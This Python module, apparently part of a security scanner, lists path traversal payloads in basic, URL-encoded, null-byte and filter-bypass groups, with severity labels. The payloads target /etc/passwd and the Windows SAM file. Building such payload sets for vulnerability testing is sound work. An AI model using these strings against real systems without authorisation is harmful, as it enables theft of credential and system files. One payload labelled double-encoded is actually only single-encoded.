"""Path traversal payload categories."""

import urllib.parse
from typing import List, Dict, Any


class PathTraversalPayloads:
    """Collection of path traversal attack payloads."""
    
    @staticmethod
    def get_basic_payloads() -> List[Dict[str, Any]]:
        """Get basic path traversal payloads."""
        return [
            {
                "payload": "../../../etc/passwd",
                "description": "Basic directory traversal",
                "severity": "high",
                "technique": "basic_traversal"
            },
            {
                "payload": "..\\..\\..\\windows\\system32\\config\\sam",
                "description": "Windows SAM file access",
                "severity": "critical",
                "technique": "windows_traversal"
            },
            {
                "payload": "/etc/passwd",
                "description": "Absolute path access",
                "severity": "high",
                "technique": "absolute_path"
            },
        ]
    
    @staticmethod
    def get_encoded_payloads() -> List[Dict[str, Any]]:
        """Get URL-encoded path traversal payloads."""
        return [
            {
                "payload": urllib.parse.quote("../../../etc/passwd"),
                "description": "URL encoded traversal",
                "severity": "high",
                "technique": "url_encoding"
            },
            {
                "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "description": "Double URL encoded traversal",
                "severity": "high",
                "technique": "double_encoding"
            },
        ]
    
    @staticmethod
    def get_null_byte_payloads() -> List[Dict[str, Any]]:
        """Get null byte injection payloads."""
        return [
            {
                "payload": "../../../etc/passwd%00.jpg",
                "description": "Null byte injection",
                "severity": "high",
                "technique": "null_byte_injection"
            },
            {
                "payload": "../../../etc/passwd\x00.png",
                "description": "Null character injection",
                "severity": "high",
                "technique": "null_char_injection"
            },
        ]
    
    @staticmethod
    def get_filter_bypass_payloads() -> List[Dict[str, Any]]:
        """Get filter bypass payloads."""
        return [
            {
                "payload": "....//....//....//etc/passwd",
                "description": "Double dot bypass",
                "severity": "medium",
                "technique": "double_dot_bypass"
            },
            {
                "payload": "..././..././..././etc/passwd",
                "description": "Alternate directory bypass",
                "severity": "medium",
                "technique": "alternate_bypass"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all path traversal payloads."""
        payloads = []
        payloads.extend(PathTraversalPayloads.get_basic_payloads())
        payloads.extend(PathTraversalPayloads.get_encoded_payloads())
        payloads.extend(PathTraversalPayloads.get_null_byte_payloads())
        payloads.extend(PathTraversalPayloads.get_filter_bypass_payloads())
        return payloads